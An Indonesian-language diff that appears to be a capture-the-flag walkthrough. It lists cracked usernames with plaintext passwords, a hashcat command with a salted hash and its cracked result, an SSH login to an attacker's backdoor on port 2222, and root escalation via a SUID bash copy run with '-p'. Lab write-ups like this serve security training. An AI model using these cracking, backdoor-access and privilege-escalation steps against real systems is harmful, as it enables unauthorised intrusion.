@@ -1,0 +1,19 @@
+setelah crack mendapat creds
+  - 1qaz2wsx         (muirland)     
+  - abcd123          (szymex)     
+  - secret12         (bee)
+  - <satu lagi lama, kemungkinan gagal>
+
+dapat password setelah crack hash dari backdoor yang digunakan attacker
+  - `hashcat -a 0 -m 1710 idk_its_from_pcap /usr/share/wordlists/rockyou.txt`
+  - `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16`
+  - james:november16
+
+masuk ke sistem target dengan backdoor
+  - `ssh -p 2222 james@IP`
+
+
+privesc dengan menggunakan file `.suid_bash` yang ada di `/home/james`, gunakan command
+  - `./.suid_bash -p`
+
+
